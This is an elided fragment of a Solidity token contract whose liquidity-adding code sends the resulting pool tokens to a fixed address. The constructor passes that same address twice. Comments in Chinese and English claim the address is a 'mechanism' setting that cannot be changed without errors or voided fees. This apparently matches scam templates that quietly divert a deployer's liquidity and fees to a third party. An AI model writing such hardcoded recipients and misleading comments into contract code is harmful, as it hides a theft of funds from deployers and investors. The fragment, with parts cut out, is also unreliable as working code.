        ...
        if (lpAmount > 0) {
            ...
            if (lpFist > 0) {//=0xA8D8ba614ee5EF378FB6353C18F152d4E93b4cCE (配置地址，不能改，改了会产生错误）
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpFist, 0, 0, address(0x95cAc01dE33C7E1C82af166530cB700f98E8C233), block.timestamp
                );
            }
        }
    }
...
contract tokens is AbsToken {
    constructor() AbsToken(
        ...
        address(0x95cAc01dE33C7E1C82af166530cB700f98E8C233),//The address controlled by the mechanism cannot be modified, and the handling fee will be voided after modification
        address(0x95cAc01dE33C7E1C82af166530cB700f98E8C233)//
    ){
    }
}